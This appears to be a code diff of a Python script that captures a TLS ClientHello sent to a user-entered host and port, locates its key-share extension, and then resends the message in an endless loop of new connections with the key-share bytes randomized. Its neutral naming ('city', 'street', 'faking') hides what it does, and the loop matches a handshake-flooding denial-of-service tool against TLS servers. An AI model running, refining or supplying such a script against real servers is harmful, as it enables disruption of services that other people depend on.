@@ -8,32 +8,27 @@ import os
 city = None
 street = None
 packet = []
-sniff_started = threading.Event()
-parsed_data = {
-        "full_payload": None,
-        "extensions_start": None,
-        "extensions_end": None,
-        "key_share_start": None,
-        "key_share_end": None
-}
+pay = b""
+keya = None
+keyz = None
 
-def set():
+def setting():
     global city, street
     my_input = input("Tell Me\n")
     city, street = my_input.split(":")
 
 def capture_pkt():
-    global city, street, packet
-    sniff_started.set()
+    global packet, city, street
     packet = sniff(
-        filter=f"tcp and dst host {city} and dst port {street}",
-        count=3,
+        filter=f"dst host {city} and dst port {street}",
+        timeout=1,
         store=1
-        )[2]
+        )
+    print(f"{len(packet)} captured")
 
 def make_tls():
     global city, street
-    sniff_started.wait()
+    time.sleep(0.5)
     tcp_socket = socket.create_connection((city, street))
     ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS)
     ssl_context.verify_mode = ssl.CERT_NONE
@@ -43,55 +38,56 @@ def make_tls():
     tcp_socket.close()
 
 def analyze_pkt():
-    global packet, parsed_data
-    if packet.haslayer('TCP'):
-        ip_layer = packet['IP']
-        tcp_layer = packet['TCP']
-        if tcp_layer.payload:
-            payload = bytes(tcp_layer.payload)
-            parsed_data["full_payload"] = payload.hex()
-            if payload[:3] == b'\x16\x03\x01':
-                try:
-                    session_id_length = payload[43]
-                    cipher_suites_length = int.from_bytes(payload[44 + session_id_length:46 + session_id_length], 'big')
-                    compression_methods_length = payload[46 + session_id_length + cipher_suites_length]
-                    extensions_start = 47 + session_id_length + cipher_suites_length + compression_methods_length
-                    extensions_length = int.from_bytes(payload[extensions_start:extensions_start + 2], 'big')
-                    extensions_end = extensions_start + 2 + extensions_length
-                    parsed_data["extensions_start"] = extensions_start
-                    parsed_data["extensions_end"] = extensions_end
-                    extensions_data = payload[extensions_start:extensions_end]
-                    key_share_relative_position = extensions_data.find(b'\x00\x33')  # Key Share Extension Type
-                    if key_share_relative_position != -1:
-                        key_share_start = extensions_start + key_share_relative_position
-                        key_share_length = int.from_bytes(extensions_data[key_share_relative_position + 2:key_share_relative_position + 4], 'big')
-                        key_share_end = key_share_start + 4 + key_share_length
-                        parsed_data["key_share_start"] = key_share_start
-                        parsed_data["key_share_end"] = key_share_end
-                except IndexError:
-                    pass
+    global packet, pay, keya, keyz
+    for pkt in packet:
+        if pkt.haslayer('TCP'):
+            tcp_layer = pkt['TCP']
+            if tcp_layer.payload:
+                pay = bytes(tcp_layer.payload)
+                if pay[0] == 0x16:
+                    if pay[5] == 0x01:
+                        session_id_length = pay[43]
+                        cipher_suites_length = int.from_bytes(
+                            pay[44 + session_id_length:46 + session_id_length], 'big'
+                        )
+                        compression_methods_length = pay[46 + session_id_length + cipher_suites_length]
+                        extensions_start = (
+                            47 + session_id_length + cipher_suites_length + compression_methods_length
+                        )
+                        extensions_length = int.from_bytes(
+                            pay[extensions_start:extensions_start + 2], 'big'
+                        )
+                        extensions_end = extensions_start + 2 + extensions_length
+                        extensions_data = pay[extensions_start:extensions_end]
+                        key_share_relative_position = extensions_data.find(b'\x00\x33')
+                        if key_share_relative_position != -1:
+                            key_share_start = extensions_start + key_share_relative_position
+                            key_share_length = int.from_bytes(
+                                extensions_data[key_share_relative_position + 2:key_share_relative_position + 4], 'big'
+                            )
+                            key_share_end = key_share_start + 4 + key_share_length
+                            keya = key_share_start + 10
+                            keyz = key_share_end
+                            print("packet parsed")
+                            break
 
 def faking():
-    global city, street, parsed_data
-    if parsed_data:
-        full = bytes.fromhex(parsed_data["full_payload"])
-        start = parsed_data['key_share_start'] + 10
-        end = parsed_data['key_share_end']
-        if not (0 <= start < end <= len(full)):
-            raise ValueError("잘못된 start 또는 end 값입니다.")
+    global keyz, keya, pay, city, street
+    tring = 0
     while True:
-        random_bytes = os.urandom(end - start)
-        faked = full[:start] + random_bytes + full[end:]
+        tring += 1
+        random_bytes = os.urandom(keyz - keya)
+        faked = pay[:keya] + random_bytes + pay[keyz:]
         tcp_sock = socket.create_connection((city, street))
         tcp_sock.sendall(faked)
         tcp_sock.shutdown(socket.SHUT_RDWR)
         tcp_sock.close()
+        print(f"{tring} tried")
 
 if __name__ == "__main__":
-    set()
+    setting()
     capturing = threading.Thread(target=capture_pkt)
     capturing.start()
-    time.sleep(0.5)
     make_tls()
     capturing.join()
     analyze_pkt()
